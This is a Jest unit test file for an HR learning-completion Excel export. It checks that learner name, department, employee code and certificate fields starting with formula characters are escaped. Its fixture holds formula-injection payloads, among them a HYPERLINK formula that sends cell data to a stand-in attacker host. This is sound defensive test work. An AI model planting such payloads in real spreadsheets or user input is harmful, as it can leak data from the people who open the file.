/**
 * ──────────────────────────────────────────────────────────
 * Unit Tests — learning completion export formula-injection guard (SEC-004)
 * ──────────────────────────────────────────────────────────
 * The legacy attendance/evaluation exports route every user-controlled string
 * through safeCell(). The learning *completion* export (buildCompletionWorkbook
 * Buffer) is a separate path that must not regress: a learner whose name /
 * department / empCode starts with `= + - @` must be written as a literal
 * string, not an executable formula, when HR opens the .xlsx.
 *
 * buildCompletionWorkbookBuffer is pure (report object → Buffer), so this is a
 * fast unit test — no DB seeding needed.
 */

const ExcelJS = require('exceljs');
const { buildCompletionWorkbookBuffer } = require('../../domains/learning/reports/export');

// A completion report whose first learner carries formula payloads in every
// user-controlled string column; the second is a benign control row.
const reportWithPayloads = () => ({
  cohort: { id: 'c1', code: 'COH-1', programId: null, programName: 'Safety 101' },
  summary: { total: 2, complete: 1, completionRate: 50, certificatesIssued: 1 },
  rows: [
    {
      learner: {
        id: 'u1',
        empCode: '=2+2',
        name: '=HYPERLINK("http://attacker.tld/?u="&A2,"Click")',
        department: '+SUM(1,1)',
      },
      attendancePercent: 100,
      attendanceMet: true,
      assessmentRequired: true,
      assessmentMet: true,
      feedbackRequired: false,
      feedbackMet: false,
      complete: true,
      certificate: { number: '-CERT-EVIL', status: 'Issued' },
    },
    {
      learner: { id: 'u2', empCode: '000123', name: 'Nguyen Van A', department: 'Marketing' },
      attendancePercent: 20,
      attendanceMet: false,
      assessmentRequired: true,
      assessmentMet: false,
      feedbackRequired: false,
      feedbackMet: false,
      complete: false,
      certificate: null,
    },
  ],
});

const loadFirstSheet = async (buffer) => {
  const wb = new ExcelJS.Workbook();
  await wb.xlsx.load(Buffer.from(buffer));
  return wb.worksheets[0];
};

describe('buildCompletionWorkbookBuffer — SEC-004 formula guard', () => {
  test('formula-leading learner strings are escaped with a leading apostrophe', async () => {
    const sheet = await loadFirstSheet(await buildCompletionWorkbookBuffer(reportWithPayloads()));

    // Header is row 4 (banner, summary, blank, header); data starts at row 5.
    const header = sheet.getRow(4).values; // 1-indexed
    const empCol = header.indexOf('Emp Code');
    const nameCol = header.indexOf('Name');
    const deptCol = header.indexOf('Department');
    const certCol = header.indexOf('Certificate');

    const evil = sheet.getRow(5);
    expect(String(evil.getCell(empCol).value)).toBe("'=2+2");
    expect(String(evil.getCell(nameCol).value).startsWith("'=")).toBe(true);
    expect(String(evil.getCell(nameCol).value)).toContain('attacker.tld');
    expect(String(evil.getCell(deptCol).value)).toBe("'+SUM(1,1)");
    expect(String(evil.getCell(certCol).value)).toBe("'-CERT-EVIL");

    // No cell value may begin with a raw formula trigger.
    let scanned = 0;
    sheet.eachRow((row) => {
      row.eachCell((cell) => {
        if (typeof cell.value === 'string') {
          scanned += 1;
          expect(/^[=+\-@\t\r]/.test(cell.value)).toBe(false);
        }
      });
    });
    expect(scanned).toBeGreaterThan(0);
  });

  test('benign strings pass through unchanged', async () => {
    const sheet = await loadFirstSheet(await buildCompletionWorkbookBuffer(reportWithPayloads()));
    const header = sheet.getRow(4).values;
    const nameCol = header.indexOf('Name');
    const deptCol = header.indexOf('Department');

    const safe = sheet.getRow(6);
    expect(String(safe.getCell(nameCol).value)).toBe('Nguyen Van A');
    expect(String(safe.getCell(deptCol).value)).toBe('Marketing');
  });
});
